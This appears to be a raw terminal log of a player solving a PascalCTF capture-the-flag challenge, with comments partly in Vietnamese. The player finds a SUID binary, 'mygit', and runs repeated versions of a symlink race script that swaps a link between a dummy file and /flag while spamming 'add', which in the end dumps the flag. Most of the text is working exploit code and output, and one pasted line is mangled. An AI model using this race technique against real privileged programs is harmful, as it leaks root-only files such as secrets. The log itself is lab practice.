```bash
zenniskayy@ZennisKayy:.../CTF/PascalCTF/Grande Inutile Tool$ ssh ClaZPwBTzy4B@git.ctf.pascalctf.it -p 2222
ClaZPwBTzy4B@git.ctf.pascalctf.it's password:
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.8.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

ClaZPwBTzy4B@dad9648cffa0:~$ ls -la git
ls: cannot access 'git': No such file or directory
ClaZPwBTzy4B@dad9648cffa0:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/su
/usr/bin/chsh
/usr/bin/mygit
/usr/bin/sudo
ClaZPwBTzy4B@dad9648cffa0:~$ find / -name "git" 2>/dev/null
/dev/shm/git
ClaZPwBTzy4B@dad9648cffa0:~$ cat > /tmp/pwn.sh <<EOF
> #!/bin/bash

VULN_BIN=/dev/shm/git


cd /tmp
rm -rf my_exploit_dir
mkdir my_exploit_dir
cd my_exploit_dir

echo "[*] Cleaning up old repository..."
rm -rf .mygit
$VULN_BIN init > /dev/null

echo "[*] Creating dummy file..."
touch valid_file

echo "[*] Starting the RACE..."

while true; do
    ln -sf valid_file target
    ln -sf /flag target
done &
PID_SWITCH=$!

for i in {1..500}; do
    $VULN_BIN add target 2>/dev/null
done

kill $PID_SWITCH

echo "[*] Checking for FLAG in objects..."
grep -r "flag" .mygit/objects/ 2>/dev/null
grep -r "PascalCTF" .mygit/objects/ 2>/dev/null

echo "--- ALL OBJECTS CONTENT ---"
find .mygit/objects -type f ! -name ".*" -exec cat {} +
echo -e "\n---------------------------"
> EOF
-bash: /tmp/pwn.sh: Permission denied
ClaZPwBTzy4B@dad9648cffa0:~$ cat > /tmp/zennis_pwn.sh <<'EOF'
#!/bin/bash

VULN_BIN=/usr/bin/mygit

WORKDIR=/tmp/zennis_exploit
rm -rf $WORKDIR
mkdir -p $WORKDIR
cd $WORKDIR

echo "[*] Khoi tao repo..."
rm -rf .mygit
$VULN_BIN init > /dev/null

echo "[*] Tao file gia..."
touch valid_file

echo "[*] Bat dau dua toc do (RACE)..."

while true; do
    ln -sf valid_file target
    ln -sf /flag target
done &
PID_SWITCH=$!

for i in {1..1000}; do
    $VULN_BIN add target 2>/dev/null
done

kill $PID_SWITCH

echo "[*] Tim kiem FLAG..."
grep -a -r "flag" .mygit/objects/ 2>/dev/null
grep -a -r "PascalCTF" .mygit/objects/ 2>/dev/null

echo "--- NOI DUNG CAC OBJECT TIM DUOC ---"
# In het ra man hinh de ban tu soi
find .mygit/objects -type f ! -name ".*" -exec cat {} +
echo -e "\n---------------------------"
EOF
-bash: /tmp/zennis_pwn.sh: Permission denied
ClaZPwBTzy4B@dad9648cffa0:~$ chmod +x /tmp/zennis_pwn.sh
chmod: cannot access '/tmp/zennis_pwn.sh': Permission denied
ClaZPwBTzy4B@dad9648cffa0:~$ /tmp/zennis_pwn.sh
-bash: /tmp/zennis_pwn.sh: Permission denied
ClaZPwBTzy4B@dad9648cffa0:~$ uuid
-bash: uuid: command not found
ClaZPwBTzy4B@dad9648cffa0:~$ uid
-bash: uid: command not found
ClaZPwBTzy4B@dad9648cffa0:~$ whoami
ClaZPwBTzy4B
ClaZPwBTzy4B@dad9648cffa0:~$ # 1. Tạo tên file ngẫu nhiên để không bị trùng
MY_SCRIPT="/dev/shm/pwn_$(whoami)_$RANDOM.sh"

# 2. Tạo nội dung script
cat > "$MY_SCRIPT" <<'EOF'
#!/bin/bash

# Binary lỗi (SUID) mà bạn đã tìm thấy
VULN_BIN=/usr/bin/mygit

# Tạo thư mục làm việc riêng biệt trong /dev/shm
WORKDIR="/dev/shm/work_$(whoami)_$RANDOM"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

echo "[*] Script: $0"
echo "[*] Workdir: $WORKDIR"

echo "[*] Khoi tao repo..."
rm -rf .mygit
$VULN_BIN init > /dev/null

echo "[*] Tao file hop le..."
touch valid_file

echo "[*] Bat dau dua toc do (RACE)..."

# --- THE SWITCHER ---
# Đổi liên tục giữa file hợp lệ và flag
while true; do
    ln -sf valid_file target
    ln -sf /flag target
done &
PID_SWITCH=$!

# --- THE TRIGGER ---
# Chạy loop add file
echo "Dang chay git add (cho xiu)..."
for i in {1..1000}; do
    $VULN_BIN add target 2>/dev/null
done

# Dừng process đổi file
kill $PID_SWITCH

echo "[*] Kiem tra ket qua..."
# Tìm kiếm flag trong các object
grep -a -r "flag" .mygit/objects/ 2>/dev/null
grep -a -r "PascalCTF" .mygit/objects/ 2>/dev/null

echo "--- NOI DUNG CAC OBJECT (Neu co) ---"
"$MY_SCRIPT"hay script tai: $MY_SCRIPT"" -exec cat {} +
Dang chay script tai: /dev/shm/pwn_ClaZPwBTzy4B_27708.sh
-bash: /dev/shm/pwn_ClaZPwBTzy4B_27708.sh: Permission denied
ClaZPwBTzy4B@dad9648cffa0:~$ bash /dev/shm/pwn_ClaZPwBTzy4B_27708.sh
[*] Script: /dev/shm/pwn_ClaZPwBTzy4B_27708.sh
[*] Workdir: /dev/shm/work_ClaZPwBTzy4B_28741
[*] Khoi tao repo...
[*] Tao file hop le...
[*] Bat dau dua toc do (RACE)...
Dang chay git add (cho xiu)...
Added 'target'
[*] Kiem tra ket qua...
--- NOI DUNG CAC OBJECT (Neu co) ---
find: ‘.mygit/objects’: Permission denied

---------------------------
ClaZPwBTzy4B@dad9648cffa0:~$ bash /dev/shm/pwn_ClaZPwBTzy4B_27708.sh
[*] Script: /dev/shm/pwn_ClaZPwBTzy4B_27708.sh
[*] Workdir: /dev/shm/work_ClaZPwBTzy4B_11623
[*] Khoi tao repo...
[*] Tao file hop le...
[*] Bat dau dua toc do (RACE)...
Dang chay git add (cho xiu)...
Added 'target'
[*] Kiem tra ket qua...
--- NOI DUNG CAC OBJECT (Neu co) ---
find: ‘.mygit/objects’: Permission denied

---------------------------
ClaZPwBTzy4B@dad9648cffa0:~$ bash /dev/shm/pwn_ClaZPwBTzy4B_27708.sh
[*] Script: /dev/shm/pwn_ClaZPwBTzy4B_27708.sh
[*] Workdir: /dev/shm/work_ClaZPwBTzy4B_9603
[*] Khoi tao repo...
[*] Tao file hop le...
[*] Bat dau dua toc do (RACE)...
Dang chay git add (cho xiu)...
Added 'target'
[*] Kiem tra ket qua...
--- NOI DUNG CAC OBJECT (Neu co) ---
find: ‘.mygit/objects’: Permission denied

---------------------------
ClaZPwBTzy4B@dad9648cffa0:~$ cd /dev/shm
ClaZPwBTzy4B@dad9648cffa0:/dev/shm$ rm -rf my_race
ClaZPwBTzy4B@dad9648cffa0:/dev/shm$ mkdir my_race
ClaZPwBTzy4B@dad9648cffa0:/dev/shm$ cd my_race
ClaZPwBTzy4B@dad9648cffa0:/dev/shm/my_race$ mkdir -p .mygit/objects
mkdir -p .mygit/refs/heads
mkdir -p .mygit/commits
ClaZPwBTzy4B@dad9648cffa0:/dev/shm/my_race$ ls -r
ClaZPwBTzy4B@dad9648cffa0:/dev/shm/my_race$ ls -R
.:
ClaZPwBTzy4B@dad9648cffa0:/dev/shm/my_race$ mkdir -p .mygit/objects
ClaZPwBTzy4B@dad9648cffa0:/dev/shm/my_race$ mkdir -p .mygit/refs/heads
ClaZPwBTzy4B@dad9648cffa0:/dev/shm/my_race$ mkdir -p .mygit/commits
ClaZPwBTzy4B@dad9648cffa0:/dev/shm/my_race$ touch .mygit/index
ClaZPwBTzy4B@dad9648cffa0:/dev/shm/my_race$ touch .mygit/HEAD
ClaZPwBTzy4B@dad9648cffa0:/dev/shm/my_race$ touch valid_file
ClaZPwBTzy4B@dad9648cffa0:/dev/shm/my_race$ while true; do
    ln -sf valid_file target
    ln -sf /flag target
done &
PID=$!
[1] 1225557
ClaZPwBTzy4B@dad9648cffa0:/dev/shm/my_race$ echo "[*] Bat dau dua toc do..."

# THE SWITCHER (Chạy ngầm)
while true; do
    ln -sf valid_file target
    ln -sf /flag target
done &
PID=$!

# THE TRIGGER (Chạy tool lỗi)
# Lặp nhiều lần để tăng khả năng trúng
echo "Dang spam lenh add..."
for i in {1..2000}; do
    /usr/bin/mygit add target 2>/dev/null
done

# 5. Dừng và xem kết quả
kill $PID

echo "----------------------------------------"
echo "[*] Kiem tra ket qua:"
# Liệt kê file (lần này chắc chắn sẽ không bị Permission Denied)
ls -la .mygit/objects/

echo "[*] Noi dung Flag tim thay:"
# Tìm chuỗi PascalCTF hoặc flag
grep -a -r "PascalCTF" .mygit/objects/
grep -a -r "flag" .mygit/objects/

# Nếu grep không ra, in hết nội dung file ra
echo "[*] Dumping all objects:"
find .mygit/objects -type f ! -name ".*" -exec cat {} +
echo -e "\n----------------------------------------"
[*] Bat dau dua toc do...
[2] 1348821
Dang spam lenh add...
Added 'target'
----------------------------------------
[*] Kiem tra ket qua:
total 4
drwxrwxr-x 2 ClaZPwBTzy4B ClaZPwBTzy4B  80 Feb  1 00:46 .
drwxrwxr-x 5 ClaZPwBTzy4B ClaZPwBTzy4B 140 Feb  1 00:45 ..
-rw-rw-r-- 1 root         ClaZPwBTzy4B   0 Feb  1 00:46 0000150500000000000015050000932300011141
-rw-rw-r-- 1 root         ClaZPwBTzy4B  45 Feb  1 00:46 d30edab0e7dd1c0f8694fc4e24e19d74559a26fe
[2]+  Terminated              while true; do
    ln -sf valid_file target; ln -sf /flag target;
done
[*] Noi dung Flag tim thay:
[*] Dumping all objects:
pascalCTF{m4ny_fr13nds_0f_m1n3_h4t3_git_btw}

----------------------------------------
ClaZPwBTzy4B@dad9648cffa0:/dev/shm/my_race$
```